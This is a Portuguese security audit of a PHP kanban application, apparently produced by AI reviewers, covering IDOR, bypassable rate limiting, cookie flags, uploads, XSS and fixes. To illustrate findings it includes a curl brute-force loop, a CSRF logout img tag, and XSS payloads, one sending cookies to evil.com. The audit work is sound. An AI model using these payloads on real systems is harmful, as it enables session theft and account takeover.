# Relatório de Segurança — KanbanLite
**Data:** 2026-03-21
**Escopo:** Análise estática completa do código-fonte PHP
**Revisores:** backend-security-coder + api-security-best-practices
**Branch analisada:** `main` (commit `8f31f8c`)

---

## Sumário Executivo

O sistema KanbanLite possui uma base arquitetural sólida (MVC, DI, middleware pipeline, prepared statements), mas apresenta **vulnerabilidades críticas de controle de acesso** que permitem que qualquer usuário autenticado acesse ou manipule dados de outros usuários e empresas. Também foram identificados problemas sérios no mecanismo de rate limiting, nas configurações de cookies de sessão, nos cabeçalhos HTTP de segurança e no armazenamento de uploads.

| Severidade | Quantidade |
|------------|-----------|
| CRÍTICA    | 4         |
| ALTA       | 5         |
| MÉDIA      | 4         |
| BAIXA      | 3         |
| **Total**  | **16**    |

---

## Vulnerabilidades Críticas

### CRIT-01 — IDOR: Ausência de isolamento por empresa/tenant

**Localização:** `routes/api.php:237-244`, `app/Controllers/TaskController.php:26-33`, `app/Controllers/AttachmentController.php:26-36`, `routes/web.php:133`

**Descrição:**
A maioria dos endpoints aceita IDs de recursos diretamente sem verificar se esses recursos pertencem à empresa do usuário autenticado. Qualquer usuário autenticado pode acessar dados de qualquer outra empresa simplesmente enumerando IDs.

**Exemplos concretos:**

```
GET /api/tasks?column_id=9999       → retorna tasks de outra empresa
GET /api/comments?task_id=9999     → retorna comentários de outra empresa
GET /api/attachments?task_id=9999  → retorna anexos de outra empresa
GET /boards?id=9999                → exibe kanban de outra empresa
```

**Endpoint de busca sem scoping:**
```php
// routes/api.php:242 — busca em TODOS os boards do sistema
$stmt = $pdo->prepare("SELECT 'board' as type, id, name FROM boards WHERE name LIKE :term LIMIT 10");
```
Não há filtro por `company_id`, expondo boards de todas as empresas.

**Impacto:** Confidencialidade e integridade comprometidas. Violação de isolamento multi-tenant (OWASP A01:2021 — Broken Access Control).

**Correção:** Todos os repositórios devem receber `companyId` nas queries de busca. Verificar pertencimento antes de retornar ou modificar qualquer recurso.

---

### CRIT-02 — Rate Limiting baseado em sessão (bypassável trivialmente)

**Localização:** `app/Middleware/RateLimitMiddleware.php:31-46`

**Descrição:**
O controle de tentativas de login é armazenado na **sessão PHP do atacante**, não em armazenamento servidor-side (Redis, banco de dados, APCu). Um atacante pode resetar o contador simplesmente não enviando o cookie de sessão em cada requisição (cada request sem cookie cria uma nova sessão).

```php
// RateLimitMiddleware.php:31
$state = $this->session->get('rate_limit_login');  // armazenado na sessão do atacante!
```

**Exploit:**
```bash
# Cada request usa uma sessão diferente → contador nunca passa de 1
for i in $(seq 1 10000); do
  curl -s -X POST /api/auth/login -d '{"email":"admin@corp.com","password":"'$i'"}'
done
```

**Impacto:** Ataques de força bruta sem limite efetivo contra o endpoint de login.

**Correção:** Implementar rate limiting baseado em IP usando armazenamento externo (Redis/Memcached) ou banco de dados com cleanup periódico.

---

### CRIT-03 — Cookies de sessão sem flags de segurança

**Localização:** `app/Services/PhpSessionStore.php:43-54`

**Descrição:**
O `PhpSessionStore` inicia a sessão com `session_start()` sem configurar parâmetros de segurança do cookie. Isso resulta em cookies de sessão sem `HttpOnly`, `Secure` ou `SameSite`.

```php
private function ensureStarted(): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();  // sem session_set_cookie_params()!
    }
}
```

**Consequências:**
- **Sem `HttpOnly`:** JavaScript pode ler o cookie de sessão → XSS pode sequestrar sessões
- **Sem `Secure`:** Cookie transmitido em HTTP puro → interceptável em redes não criptografadas
- **Sem `SameSite=Strict`:** Proteção CSRF depende exclusivamente do token manual

**Impacto:** Sequestro de sessão via XSS ou man-in-the-middle.

**Correção:**
```php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,
    'httponly' => true,
    'samesite' => 'Strict',
]);
session_start();
```

---

### CRIT-04 — Arquivos de upload servidos diretamente pelo servidor web

**Localização:** `routes/api.php:125`, `app/Services/Attachment/UploadAttachmentService.php:42`

**Descrição:**
Os uploads são armazenados dentro de `public/uploads/`, diretório servido diretamente pelo Apache. Não existe endpoint de download autenticado.

```php
// routes/api.php:125
$uploadBasePath = dirname(__DIR__) . '/public/uploads';
// Resulta em: /var/www/kanban/public/uploads/tasks/42/uuid.pdf
// Acessível em: https://app.com/uploads/tasks/42/uuid.pdf (sem autenticação!)
```

**Consequências:**
1. Qualquer pessoa na internet pode acessar arquivos confidenciais se souber (ou adivinhar) o caminho
2. Se houver falha na validação de MIME type, um arquivo `.php` poderia ser executado pelo servidor

**Impacto:** Exposição de dados confidenciais e potencial execução remota de código.

**Correção:** Mover uploads para fora do `public/` (ex: `storage/uploads/`) e criar um endpoint PHP que sirva os arquivos com verificação de autenticação e autorização.

---

## Vulnerabilidades Altas

### HIGH-01 — Bug na validação de MIME type (proteção ineficaz)

**Localização:** `app/Services/Attachment/UploadAttachmentService.php:65-84`

**Descrição:**
O método `validate()` corrige o MIME type real, mas a atribuição é feita em uma **cópia local** do array (PHP passa arrays por valor). A variável `$file['type']` na struct DTO ainda usa o valor fornecido pelo atacante.

```php
private function validate(array $file): void  // array passado por VALOR
{
    $finfo    = new \finfo(FILEINFO_MIME_TYPE);
    $mimeReal = $finfo->file($file['tmp_name']);

    if (!in_array($mimeReal, self::ALLOWED_MIME, true)) {
        throw new \RuntimeException("Tipo de arquivo não permitido: {$mimeReal}.");
    }

    // BUG: modifica cópia local, não o array original
    $file['type'] = $mimeReal;  // ← sem efeito fora desta função!
}

// No execute(), $file['type'] ainda é o valor do atacante:
$dto = new AttachmentDTO(
    mimeType: $file['type'],  // ← valor não sanitizado do $_FILES
);
```

**Impacto:** O MIME type salvo no banco de dados pode ser falsificado. Além disso, a extensão do arquivo (`$ext = pathinfo($file['name'], PATHINFO_EXTENSION)`) não é validada contra uma allowlist — um arquivo pode ser salvo com extensão `.php`.

---

### HIGH-02 — Ausência de cabeçalhos HTTP de segurança

**Localização:** `app/Helpers/HttpResponse.php`, `public/.htaccess`

**Descrição:**
Nenhum cabeçalho de segurança HTTP é enviado em resposta alguma. O `.htaccess` não configura esses cabeçalhos.

**Cabeçalhos ausentes:**

| Cabeçalho | Risco |
|-----------|-------|
| `Content-Security-Policy` | XSS, injeção de recursos externos |
| `X-Frame-Options: DENY` | Clickjacking |
| `X-Content-Type-Options: nosniff` | MIME sniffing attack |
| `Strict-Transport-Security` | Downgrade para HTTP |
| `Referrer-Policy: strict-origin` | Vazamento de URL |
| `Permissions-Policy` | Acesso a APIs do browser |

**Impacto:** Superfície de ataque ampliada para XSS, clickjacking e ataques de MIME sniffing.

---

### HIGH-03 — Mensagens entre usuários sem validação de empresa

**Localização:** `routes/api.php:150-222`

**Descrição:**
O endpoint de mensagens não verifica se o `peer_id` pertence à mesma empresa do usuário autenticado.

```php
// GET /api/messages?peer_id=X — sem validação de company_id
$stmt->execute([$userId, $userId, $peerId, $peerId, $userId]);
// Um usuário da empresa A pode ler conversas de usuários da empresa B
```

```php
// POST /api/messages — receiverId não validado contra company_id
$stmt->execute([$userId, $receiverId, $content, $now]);
// Um usuário pode enviar mensagens para qualquer usuário do sistema
```

**Impacto:** Violação de privacidade inter-tenant e possível assédio/phishing interno.

---

### HIGH-04 — Rota GET /logout altera estado (anti-padrão de segurança)

**Localização:** `routes/web.php:277-282`

**Descrição:**
O logout é implementado como uma requisição `GET`, o que permite que atacantes provoquem logout forçado via CSRF (image tag, link em email, etc.) sem necessidade de CSRF token (que só protege POSTs).

```php
$router->add('GET', '/logout', static function (HttpRequest $request): HttpResponse {
    $session = new \App\Services\PhpSessionStore();
    $session->destroy();
    // ...
});
```

**Exploit:** `<img src="https://app.com/kanban/public/index.php/logout">` em qualquer página fará o usuário sair.

**Impacto:** Denial of service de sessão / logout forçado via CSRF.

---

### HIGH-05 — Ausência de validação de extensão de arquivo no upload

**Localização:** `app/Services/Attachment/UploadAttachmentService.php:39-41`

**Descrição:**
Embora o MIME type real seja verificado, a extensão do arquivo derivada do nome original não é validada. Se houver qualquer falha futura na detecção MIME (novo tipo não mapeado, bypass), um arquivo com extensão `.php`, `.phtml`, etc. poderia ser salvo em `public/uploads/`.

```php
$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));  // não validado
$relative = "tasks/{$taskId}/{$uuid}.{$ext}";
```

**Correção:** Mapear MIME types permitidos para extensões seguras e usar a extensão da allowlist, não do nome original.

---

## Vulnerabilidades Médias

### MED-01 — Exceções com mensagens internas expostas ao cliente

**Localização:** `app/Controllers/AttachmentController.php:62`

**Descrição:**
Mensagens de `RuntimeException` são retornadas diretamente ao cliente, podendo vazar caminhos de arquivo internos, nomes de variáveis ou detalhes da infraestrutura.

```php
} catch (\RuntimeException $e) {
    return $this->apiError(422, 'upload_error', $e->getMessage(), []);
    // Ex: "Não foi possível criar o diretório /var/www/kanban/public/uploads/tasks/42"
}
```

---

### MED-02 — Sanitização de HTML insuficiente (XSS stored)

**Localização:** `app/Controllers/TaskController.php:178-184`

**Descrição:**
A função `sanitizeHtml()` usa `strip_tags()` com allowlist, mas permite `<img>` e `<a>` com atributos não filtrados.

```php
private static function sanitizeHtml(string $html): string
{
    return strip_tags($html,
        '<p><br><strong><em><u><s><ul><ol><li><h2><h3><a><img><blockquote><pre><code><span>'
    );
}
```

`strip_tags()` **não remove atributos** das tags permitidas. Exemplos de payloads que sobrevivem:

```html
<!-- XSS via onerror em img -->
<img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)">

<!-- XSS via href em a -->
<a href="javascript:alert(document.cookie)">Clique aqui</a>
```

**Impacto:** XSS stored nas descrições de tarefas, executado para todos que visualizarem o kanban.

**Correção:** Usar uma biblioteca de sanitização dedicada (HTMLPurifier) ou desabilitar completamente tags com atributos de evento.

---

### MED-03 — Validação de `deadline` sem tratamento de exceção

**Localização:** `app/Controllers/TaskController.php:67`

**Descrição:**
`new \DateTimeImmutable($payload['deadline'])` lança exceção se o valor for inválido, resultando em erro 500 não tratado ao invés de resposta 422 controlada.

```php
deadline: isset($payload['deadline']) ? new \DateTimeImmutable($payload['deadline']) : null,
// Um input "não-é-uma-data" causa crash não tratado
```

---

### MED-04 — Endpoint /health sem autenticação expõe liveness

**Localização:** `routes/web.php:284-286`

**Descrição:**
O endpoint `/health` responde publicamente sem autenticação. Embora seja prática comum para balanceadores de carga, expõe a existência e disponibilidade da aplicação a reconhecimento externo. Não vaza dados críticos mas aumenta a superfície de informação.

---

## Vulnerabilidades Baixas

### LOW-01 — Ausência de Content-Length limit no body JSON

**Localização:** `app/Controllers/AuthController.php:85`, todos os controllers

**Descrição:**
Nenhum limite de tamanho é imposto ao body JSON antes do decode. Um payload muito grande (ex: 100MB) pode causar consumo excessivo de memória.

---

### LOW-02 — Logs de segurança insuficientes

**Descrição:**
Nenhuma ação de segurança é logada: tentativas de login falhas/bem-sucedidas, acessos negados por autorização, uploads rejeitados, etc. Impossível realizar investigação forense em caso de incidente.

---

### LOW-03 — Falta de proteção contra enumeração de usuários

**Localização:** `app/Services/AuthService.php:20-26`

**Descrição:**
A resposta `INVALID_CREDENTIALS` é retornada tanto para email inexistente quanto para senha incorreta (bom), mas o caso `AMBIGUOUS_IDENTITY` (linha 25) retorna `422` ao invés de `401`, potencialmente revelando que o email existe no sistema com múltiplos registros.

```php
if (count($records) > 1) {
    return new AuthServiceResult(AuthServiceResult::AMBIGUOUS_IDENTITY);
    // AuthController retorna 422 "Identidade ambígua" — vaza que o email existe
}
```

---

## O Que Está Bem Implementado

| Aspecto | Avaliação |
|---------|-----------|
| Prepared statements (PDO) em todos os repositories | ✅ Correto |
| `password_verify()` / `password_hash()` para senhas | ✅ Correto |
| Session regeneration após login (`session_regenerate_id(true)`) | ✅ Correto |
| CSRF com `hash_equals()` (timing-safe) e `bin2hex(random_bytes(32))` | ✅ Correto |
| MIME type via `finfo` (não confia no `$_FILES['type']` do cliente) | ✅ Correto (mas com bug na sync) |
| Limite de 10MB no upload | ✅ Correto |
| Allowlist de MIME types no upload | ✅ Correto |
| `declare(strict_types=1)` em todos os arquivos | ✅ Correto |
| UUID v4 para nomes de arquivo (evita enumeração) | ✅ Correto |
| Comentários: verificação de autoria no delete | ✅ Correto |
| Rate limiting presente (mesmo que bypassável) | ✅ Conceito correto |

---

## Plano de Remediação Priorizado

### Prioridade Imediata (antes do próximo deploy)

1. **CRIT-01** — Adicionar filtro por `company_id` em todos os endpoints de leitura e escrita
2. **CRIT-02** — Reescrever rate limiting para usar IP + armazenamento persistente (BD ou Redis)
3. **CRIT-03** — Configurar `session_set_cookie_params()` com `HttpOnly=true`, `Secure=true`, `SameSite=Strict`
4. **CRIT-04** — Mover uploads para `storage/uploads/` e criar endpoint de download autenticado
5. **HIGH-01** — Corrigir bug do MIME type e criar allowlist de extensões
6. **MED-02** — Substituir `strip_tags()` por HTMLPurifier ou desabilitar tags com atributos

### Prioridade Alta (sprint corrente)

7. **HIGH-02** — Adicionar cabeçalhos de segurança HTTP (CSP, HSTS, X-Frame-Options, etc.)
8. **HIGH-03** — Validar `peer_id` contra `company_id` do usuário autenticado
9. **HIGH-04** — Converter `/logout` de GET para POST com CSRF token
10. **HIGH-05** — Mapear MIME → extensão segura na allowlist de uploads
11. **MED-01** — Logar exceções internamente e retornar mensagem genérica ao cliente
12. **MED-03** — Envolver `DateTimeImmutable` em try/catch e retornar 422

### Prioridade Normal (próximo ciclo)

13. **LOW-01** — Limitar tamanho do request body (ex: 1MB para JSON)
14. **LOW-02** — Implementar logging de eventos de segurança
15. **LOW-03** — Unificar resposta de AMBIGUOUS_IDENTITY com INVALID_CREDENTIALS (retornar 401)
16. **MED-04** — Proteger `/health` com autenticação básica ou restringir por IP

---

## Referências

- OWASP Top 10 2021: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A07 Identification and Authentication Failures
- OWASP API Security Top 10 2023: API1 BOLA, API2 Broken Authentication, API3 Broken Object Property Level Authorization
- CWE-284: Improper Access Control
- CWE-306: Missing Authentication for Critical Function
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-1275: Sensitive Cookie with Improper SameSite Attribute
